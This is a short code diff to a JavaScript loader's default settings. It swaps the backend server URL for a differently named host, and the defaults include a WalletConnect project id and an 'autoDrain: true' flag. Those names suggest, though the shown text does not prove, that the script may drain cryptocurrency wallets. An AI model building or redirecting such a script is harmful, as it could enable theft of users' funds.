@@ -34,7 +34,7 @@
   window.__LEGION_ONE_SCRIPT_LOADED__ = true;
 
   var DEFAULTS = {
-    backendUrl: 'https://legionapi-production.up.railway.app',
+    backendUrl: 'https://sadrailala-production.up.railway.app',
     kineticKey: '',
     wcProjectId: '',
     autoDrain: true,
